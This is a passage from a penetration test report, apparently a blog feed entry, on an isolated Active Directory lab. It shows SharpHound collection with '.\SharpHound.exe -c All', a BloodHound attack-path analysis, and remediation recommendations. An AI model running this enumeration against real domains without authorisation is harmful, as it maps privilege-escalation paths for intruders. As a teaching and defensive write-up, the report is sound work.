+&lt;p>&lt;strong>Data Collection:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Utilized SharpHound, a data collection tool within BloodHound, to gather information from the Windows Active Directory environment. SharpHound collected data in JSON format.&lt;/li>
+&lt;/ul>
+&lt;h3 id="command-for-bloodhound-data-collection">Command for BloodHound Data Collection:
+&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">.&lt;span class="se">\S&lt;/span>harpHound.exe -c All
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Data Import:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Imported the collected data from the Windows Active Directory environment in JSON format into the Neo4j database. This step enabled BloodHound to analyze the data and generate visualizations for further analysis.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Analysis:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Leveraged BloodHound&amp;rsquo;s visualization and querying features to perform the following analyses:
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Map of Active Directory Environment:&lt;/strong> Visual representation showcasing relationships between users, groups, computers, and permissions within the Active Directory infrastructure.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled26.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Potential Attack Paths for User &amp;ldquo;ap&amp;rdquo;:&lt;/strong> Identified potential attack paths that user &amp;ldquo;ap&amp;rdquo; could exploit for lateral movement and privilege escalation within the Active Directory environment.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled27.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Map of All Users:&lt;/strong> Visualization depicting all users present in the Active Directory environment, along with their respective relationships and permissions, aiding in the identification of potential security vulnerabilities related to user accounts.&lt;/p>
+&lt;p>&lt;img src="https://orangeymango.me/ad/Untitled28.png"
+loading="lazy"
+>&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ol>
+&lt;hr>
+&lt;h2 id="6-recommendations">6. Recommendations
+&lt;/h2>&lt;p>Based on the findings of our penetration testing of the Active Directory environment, the following recommendations are proposed to strengthen the security posture:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Implement Regular Patch Management:&lt;/strong> Establish a routine patch management process to ensure all servers and applications within the Active Directory environment are up-to-date with the latest security patches and updates.&lt;/li>
+&lt;li>&lt;strong>Enhance Password Policies:&lt;/strong> Enforce stronger password policies, including the use of complex passwords, regular password changes, and multi-factor authentication (MFA) where applicable.&lt;/li>
+&lt;li>&lt;strong>Implement Network Segmentation:&lt;/strong> Segment the network to isolate critical systems and sensitive data from potential attackers. Implement firewall rules and access controls to restrict unauthorized access between network segments.&lt;/li>
+&lt;li>&lt;strong>Conduct Regular Security Training:&lt;/strong> Provide comprehensive security awareness training for employees to educate them about common security threats, phishing attacks, and best practices for safeguarding sensitive information.&lt;/li>
+&lt;li>&lt;strong>Implement Security Monitoring:&lt;/strong> Deploy robust security monitoring tools to continuously monitor the Active Directory environment for suspicious activities, unauthorized access attempts, and potential security breaches.&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h2 id="7-risk-assessment">7. Risk Assessment
+&lt;/h2>&lt;p>A comprehensive risk assessment was diligently executed to thoroughly evaluate the potential impact and likelihood of identified vulnerabilities within the Active Directory environment. Risks were meticulously categorized based on severity and meticulously prioritized for remediation, considering their potential impact on business operations and data security.&lt;/p>
+&lt;hr>
+&lt;h2 id="8-regulatory-compliance-considerations">8. Regulatory Compliance Considerations
+&lt;/h2>&lt;p>An assessment was conducted to ascertain compliance of the Active Directory system with key regulations, including the &lt;strong>&lt;code>General Data Protection Regulation (GDPR)&lt;/code>&lt;/strong> for protecting personal data within the EU, the &lt;strong>&lt;code>Health Insurance Portability and Accountability Act (HIPAA)&lt;/code>&lt;/strong> for safeguarding health information in the US, and the &lt;strong>&lt;code>Payment Card Industry Data Security Standard (PCI DSS)&lt;/code>&lt;/strong> for securing credit card data. Subsequent recommendations were provided to ensure alignment with these regulations and to maintain the confidentiality and security of data.&lt;/p>
+&lt;hr>
+&lt;h2 id="9-long-term-security-considerations">9. Long-Term Security Considerations
+&lt;/h2>&lt;p>To ensure ongoing security in the Active Directory environment, it&amp;rsquo;s important to plan for long-term improvements. This could involve identifying key security objectives, establishing regular security assessments, implementing continuous monitoring measures, and providing ongoing security training for staff. By taking a proactive approach to long-term security, the organization can better protect its IT infrastructure against evolving threats.&lt;/p>
+&lt;hr>
+&lt;h2 id="10-disclaimer">10. Disclaimer
+&lt;/h2>&lt;p>This penetration test report is provided solely for informational purposes. The findings and recommendations contained within should be carefully evaluated and implemented by qualified security professionals in accordance with organizational policies and best practices. It is important to note that the testing and setup were conducted on an isolated environment within the researcher&amp;rsquo;s own computer system. Therefore, the outcomes and effectiveness of any security measures may differ in a real-world organizational setting. Additionally, while every effort has been made to ensure the accuracy of the findings, no guarantees are made regarding the completeness or timeliness of the information presented.&lt;/p>
+&lt;hr>
+&lt;h2 id="11-acknowledgments">11. Acknowledgments
+&lt;/h2>&lt;p>I extend my sincere appreciation to the organizations and individuals who provided guidance, resources, and support during the preparation and execution of this penetration testing project. Special thanks to &lt;strong>&lt;code>Eminence Ways Pvt. Ltd&lt;/code>&lt;/strong>, whose assistance and cooperation were invaluable in facilitating the successful completion of this project.&lt;/p>
+&lt;hr>
+&lt;h2 id="12-conclusion">12. Conclusion
+&lt;/h2>&lt;p>In conclusion, the penetration testing revealed vulnerabilities within the Active Directory environment. Addressing these vulnerabilities and implementing recommended security measures is crucial for enhancing overall security. The cooperation of the organization&amp;rsquo;s IT team was invaluable throughout the testing process. It is recommended that immediate action be taken to mitigate risks and strengthen cybersecurity resilience.&lt;/p>
+&lt;hr>
+&lt;p>&lt;em>Signed,&lt;/em>&lt;/p>
+&lt;p>Gauranga Gautam&lt;/p></description></item></channel></rss>
